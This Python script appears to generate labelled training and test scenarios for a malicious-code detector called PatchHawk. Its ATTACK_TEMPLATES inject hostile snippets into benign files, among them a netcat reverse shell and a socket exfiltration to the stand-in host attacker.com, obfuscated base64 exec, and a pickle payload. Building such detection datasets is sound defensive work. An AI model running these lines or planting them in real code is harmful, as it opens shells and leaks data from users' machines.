"""
Scenario generator for PatchHawk.

Track A: Meta synthetic-data-kit CLI (optional, graceful fallback).
Track B: Custom mutation engine that injects attack templates into benign
         Python files. Always produces ≥ 50 scenarios.

Output: a single JSON file with fields:
    id, type, code_snippet, patch (or null), unit_test_code,
    label, source, attack_type
"""

import json
import os
import random
import subprocess
import tempfile
import uuid
from pathlib import Path

# ============================================================
# Attack Templates for Mutation Engine (Track B)
# ============================================================
ATTACK_TEMPLATES = {
    "typosquatting": {
        "inject": "import pythonn\n\n",
        "patch": "",
    },
    "obfuscated_exec": {
        "inject": (
            "import base64\n"
            "exec(base64.b64decode('cHJpbnQoIkhlbGxvIGZyb20gaGlkZGVuIGV4ZWMhIik='))\n\n"
        ),
        "patch": "",
    },
    "env_hijack": {
        "inject": (
            "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\n"
        ),
        "patch": "",
    },
    "subprocess_backdoor": {
        "inject": (
            "import subprocess\n"
            "try:\n"
            "    subprocess.call(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])\n"
            "except:\n"
            "    pass\n\n"
        ),
        "patch": "",
    },
    "eval_hidden": {
        "inject": (
            "def safe_eval(x):\n"
            "    return eval(x)\n"
            'safe_eval(\'__import__("os").system("echo 1")\')\n\n'
        ),
        "patch": "",
    },
    "pickle_deserialization": {
        "inject": (
            "import pickle\n"
            "pickle.loads(b\"c__builtin__\\neval\\n(Vprint('malicious')\\ntR.\")\n\n"
        ),
        "patch": "",
    },
    "socket_exfil": {
        "inject": (
            "import socket\n"
            "try:\n"
            "    s = socket.socket()\n"
            "    s.connect(('attacker.com', 80))\n"
            "    s.sendall(b'exfiltrated data')\n"
            "except:\n"
            "    pass\n\n"
        ),
        "patch": "",
    },
    "malicious_import": {
        "inject": "__import__('os').system('echo pwned > /tmp/pwned')\n\n",
        "patch": "",
    },
}

# ============================================================
# Benign file loader
# ============================================================


def load_benign_files(benign_dir: str) -> list:
    files_data = []
    if not os.path.exists(benign_dir):
        return files_data
    for filename in sorted(os.listdir(benign_dir)):
        if filename.endswith(".py"):
            with open(os.path.join(benign_dir, filename)) as fh:
                files_data.append({"filename": filename, "code": fh.read()})
    return files_data


# ============================================================
# Auto-generated lightweight unit tests
# ============================================================


def auto_generate_unit_test(filename: str, code: str) -> str:
    """Produce a simple assertion that passes against the benign code."""
    test = "import code\n"
    if "fibonacci" in code:
        test += "assert code.fibonacci(5) == 5\n"
    elif "factorial" in code:
        test += "assert code.factorial(5) == 120\n"
    elif "is_prime" in code:
        test += "assert code.is_prime(7) == True\n"
    elif "gcd" in code:
        test += "assert code.gcd(48, 18) == 6\n"
    elif "is_palindrome" in code:
        test += "assert code.is_palindrome('racecar') == True\n"
    elif "celsius_to_fahrenheit" in code:
        test += "assert code.celsius_to_fahrenheit(0) == 32\n"
    else:
        test += "assert True  # module loaded successfully\n"
    return test


# ============================================================
# Track B – custom mutation engine (always available)
# ============================================================


def generate_track_b_scenarios(benign_files: list) -> list:
    """Generate ≥ 50 scenarios: 25 TP, 15 FP, 15 functional."""
    scenarios = []

    # ── True Positives (25) ──────────────────────────────────
    for i in range(25):
        bf = random.choice(benign_files)
        attack_name, attack_data = random.choice(list(ATTACK_TEMPLATES.items()))
        malicious_code = attack_data["inject"] + bf["code"]
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append(
            {
                "id": f"tp_{uuid.uuid4().hex[:8]}",
                "type": "true_positive",
                "code_snippet": malicious_code,
                "patch": bf["code"],
                "unit_test_code": test_code,
                "label": "malicious",
                "source": "mutation_engine",
                "attack_type": attack_name,
            }
        )

    # ── False Positives (15) ─────────────────────────────────
    fp_templates = [
        (
            "fp_eval",
            "def safe_calc(expr):\n"
            "    # Legit eval in controlled env\n"
            "    return eval(expr, {'__builtins__': {}}, {})\n\n",
        ),
        (
            "fp_requests",
            "import requests\n"
            "# Just checking internet\n"
            "try:\n"
            "    requests.get('https://8.8.8.8', timeout=1)\n"
            "except:\n"
            "    pass\n\n",
        ),
        (
            "fp_os_environ",
            "import os\n"
            "# Setup proxy\n"
            "os.environ['HTTP_PROXY'] = 'http://proxy.local:8080'\n\n",
        ),
        (
            "fp_base64",
            "import base64\n"
            "def encode_msg(msg):\n"
            "    return base64.b64encode(msg.encode())\n\n",
        ),
        (
            "fp_subprocess_legit",
            "import subprocess\n"
            "# Run a safe command for build process\n"
            "result = subprocess.run(['echo', 'build ok'], capture_output=True)\n\n",
        ),
    ]
    for i in range(15):
        bf = random.choice(benign_files)
        fp_name, fp_code = random.choice(fp_templates)
        suspicious_code = fp_code + bf["code"]
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append(
            {
                "id": f"fp_{uuid.uuid4().hex[:8]}",
                "type": "false_positive",
                "code_snippet": suspicious_code,
                "patch": None,
                "unit_test_code": test_code,
                "label": "benign",
                "source": "mutation_engine",
                "attack_type": None,
            }
        )

    # ── Functional / Clean (15) ──────────────────────────────
    for i in range(15):
        bf = random.choice(benign_files)
        test_code = auto_generate_unit_test(bf["filename"], bf["code"])
        scenarios.append(
            {
                "id": f"fn_{uuid.uuid4().hex[:8]}",
                "type": "functional",
                "code_snippet": bf["code"],
                "patch": None,
                "unit_test_code": test_code,
                "label": "benign",
                "source": "mutation_engine",
                "attack_type": None,
            }
        )

    return scenarios  # 55 total from Track B alone


# ============================================================
# Track A – Meta synthetic-data-kit (optional)
# ============================================================


def generate_track_a_scenarios_with_sdk(output_dir: str, num_samples: int = 10) -> list:
    """
    Track A: Use Meta's synthetic-data-kit to generate high-quality
    code examples. Falls back gracefully if not installed.
    """
    sdk_scenarios: list = []

    # Check CLI availability
    try:
        subprocess.run(
            ["synthetic-data-kit", "--help"],
            capture_output=True,
            check=True,
        )
    except (subprocess.SubprocessError, FileNotFoundError):
        print("⚠️  Meta synthetic-data-kit CLI not found. Track A disabled.")
        return sdk_scenarios

    config_path = Path(__file__).parent / "sdk_config.yaml"
    if not config_path.exists():
        print(f"⚠️  SDK config not found at {config_path}. Track A disabled.")
        return sdk_scenarios

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_path = Path(tmpdir)
        workspace = tmp_path / "sdk_workspace"
        workspace.mkdir()

        try:
            benign_dir = Path(__file__).parent / "benign"
            if benign_dir.exists():
                subprocess.run(
                    [
                        "synthetic-data-kit",
                        "ingest",
                        str(benign_dir),
                        "--output",
                        str(workspace / "ingested"),
                    ],
                    check=True,
                    capture_output=True,
                )

            subprocess.run(
                [
                    "synthetic-data-kit",
                    "create",
                    str(workspace / "ingested"),
                    "--type",
                    "qa",
                    "-c",
                    str(config_path),
                    "--output",
                    str(workspace / "created"),
                ],
                check=True,
                capture_output=True,
                timeout=600,
            )

            subprocess.run(
                [
                    "synthetic-data-kit",
                    "curate",
                    str(workspace / "created"),
                    "--output",
                    str(workspace / "curated"),
                ],
                check=True,
                capture_output=True,
            )

            output_json = workspace / "final_sdk.json"
            subprocess.run(
                [
                    "synthetic-data-kit",
                    "save-as",
                    str(workspace / "curated"),
                    "--format",
                    "json",
                    "--output",
                    str(output_json),
                ],
                check=True,
                capture_output=True,
            )

            if output_json.exists():
                with open(output_json) as fh:
                    data = json.load(fh)
                for item in data:
                    sdk_scenarios.append(
                        {
                            "id": f"tp_sdk_{uuid.uuid4().hex[:8]}",
                            "type": "true_positive"
                            if item.get("patch")
                            else "functional",
                            "code_snippet": item.get("code_snippet")
                            or item.get("code"),
                            "patch": item.get("patch"),
                            "unit_test_code": item.get(
                                "unit_test_code", "import code\nassert True"
                            ),
                            "label": "malicious" if item.get("patch") else "benign",
                            "source": "synthetic_data_kit",
                            "attack_type": item.get("attack_type", "llm_generated"),
                        }
                    )

        except subprocess.TimeoutExpired:
            print("⚠️  SDK generation timed out.")
        except subprocess.CalledProcessError as e:
            msg = e.stderr.decode() if e.stderr else "Unknown error"
            print(f"⚠️  SDK command failed: {msg}")

    return sdk_scenarios


# ============================================================
# Track HF – Hugging Face dataset loader (optional)
# ============================================================


def generate_track_hf_scenarios(
    hf_dataset_id: str,
    split: str = "train",
    text_field: str = "code",
    num_samples: int = 0,
    only_python: bool = False,
) -> list:
    """
    Load snippets from a Hugging Face dataset and return scenario dicts.
    - `hf_dataset_id`: e.g. "username/repo" or a dataset id on the Hub
    - `text_field`: field name in dataset containing the code/snippet
    - `num_samples`: 0 => load entire split, otherwise limit
    """
    hf_scenarios: list = []

    try:
        from datasets import load_dataset
    except Exception as e:
        print(f"⚠️  Install `datasets` (pip install datasets). Error: {e}")
        return hf_scenarios

    try:
        # If a local path is provided, prefer local loading:
        p = Path(hf_dataset_id)
        if p.exists():
            # Saved dataset directory created by `save_to_disk`
            if p.is_dir():
                try:
                    from datasets import load_from_disk

                    ds = load_from_disk(str(p))
                except Exception:
                    # Fall back to loading as files inside the dir
                    ds = load_dataset("json", data_files=str(p / "*.jsonl"))
            else:
                # Single file: jsonl / json / ndjson or plain text
                if p.suffix.lower() in (".jsonl", ".json", ".ndjson"):
                    ds = load_dataset("json", data_files=str(p))
                else:
                    # Treat as plain text file, one example per line
                    with open(p, "r", encoding="utf-8") as fh:
                        lines = [l.rstrip("\n") for l in fh if l.strip()]
                    # create a dataset from python list
                    from datasets import Dataset

                    ds = Dataset.from_dict({"text": lines})
        else:
            ds = load_dataset(hf_dataset_id, split=split)
    except Exception as e:
        print(f"⚠️  Could not load HF dataset {hf_dataset_id}: {e}")
        return hf_scenarios

    # optionally limit
    try:
        total = len(ds)
    except Exception:
        total = None

    if num_samples and num_samples > 0 and total:
        num = min(num_samples, total)
        try:
            ds = ds.select(range(num))
        except Exception:
            pass

    # iterate over dataset rows
    for item in ds:
        code = None
        unit_test = "import code\nassert True"

        if isinstance(item, dict):
            # optional language filter
            if only_python:
                lang = (item.get("lang") or item.get("language") or "").lower()
                if lang and lang != "python":
                    continue

            # prefer accepted/chosen field when present (e.g., 'chosen')
            for k in ("chosen", text_field, "code", "snippet", "text"):
                if k in item and item[k]:
                    code = item[k]
                    break

            # best-effort unit test / label / patch extraction
            unit_test = item.get("unit_test_code", unit_test)
            label = item.get("label") or item.get("classification") or "benign"
            patch = item.get("patch")
            attack_type = item.get("vulnerability") or item.get("attack_type")
        else:
            # plain examples (no fields)
            code = str(item)
            label = "benign"
            patch = None
            attack_type = None

        if not code:
            continue

        hf_scenarios.append(
            {
                "id": f"hf_{uuid.uuid4().hex[:8]}",
                "type": "true_positive" if patch or (isinstance(label, str) and label.lower() in ("malicious", "vuln", "vulnerable")) else "functional",
                "code_snippet": code,
                "patch": patch,
                "unit_test_code": unit_test,
                "label": "malicious" if (patch or (isinstance(label, str) and label.lower() in ("malicious", "vuln", "vulnerable"))) else "benign",
                "source": "huggingface_dataset",
                "attack_type": attack_type,
            }
        )

    return hf_scenarios


# ============================================================
# CLI entry point
# ============================================================


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Generate scenarios for PatchHawk")
    parser.add_argument(
        "--benign-dir",
        type=str,
        default="patchhawk/data/benign/",
    )
    parser.add_argument(
        "--output",
        type=str,
        default="patchhawk/data/scenarios.json",
    )
    parser.add_argument(
        "--use-sdk",
        action="store_true",
        help="Use Meta synthetic-data-kit (requires CLI + vLLM)",
    )
    parser.add_argument(
        "--sdk-samples",
        type=int,
        default=10,
        help="Number of SDK samples to generate",
    )
    parser.add_argument(
        "--hf-dataset",
        type=str,
        default=None,
        help="HuggingFace dataset id (e.g., username/repo) to import snippets from",
    )
    parser.add_argument(
        "--hf-split",
        type=str,
        default="train",
        help="Split name to load from the HF dataset",
    )
    parser.add_argument(
        "--hf-field",
        type=str,
        default="code",
        help="Field name in HF dataset that contains the code/snippet",
    )
    parser.add_argument(
        "--hf-samples",
        type=int,
        default=0,
        help="Number of HF samples to use (0 = all)",
    )
    parser.add_argument(
        "--hf-only-python",
        action="store_true",
        default=False,
        help="If set, only include HF examples where language/lang == python",
    )
    args = parser.parse_args()

    benign_files = load_benign_files(args.benign_dir)
    if not benign_files:
        print(f"No benign files found in {args.benign_dir}. Create some first.")
        return

    # Track B (always)
    scenarios = generate_track_b_scenarios(benign_files)

    # Track A (optional)
    if args.use_sdk:
        sdk = generate_track_a_scenarios_with_sdk(
            os.path.dirname(args.output), args.sdk_samples
        )
        scenarios.extend(sdk)
        if sdk:
            print(f"Added {len(sdk)} SDK-generated scenarios.")

    # Track HF (optional)
    if getattr(args, "hf_dataset", None):
        hf = generate_track_hf_scenarios(
            args.hf_dataset,
            args.hf_split,
            args.hf_field,
            args.hf_samples,
            args.hf_only_python,
        )
        scenarios.extend(hf)
        if hf:
            print(f"Added {len(hf)} HuggingFace scenarios.")

    random.shuffle(scenarios)
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    with open(args.output, "w") as fh:
        json.dump(scenarios, fh, indent=2)

    tp = len([s for s in scenarios if s["label"] == "malicious"])
    bn = len([s for s in scenarios if s["label"] == "benign"])
    print(f"✅ Total scenarios: {len(scenarios)}")
    print(f"   Malicious (TP): {tp}")
    print(f"   Benign (FP+fn): {bn}")
    print(f"   Saved to {args.output}")


if __name__ == "__main__":
    main()
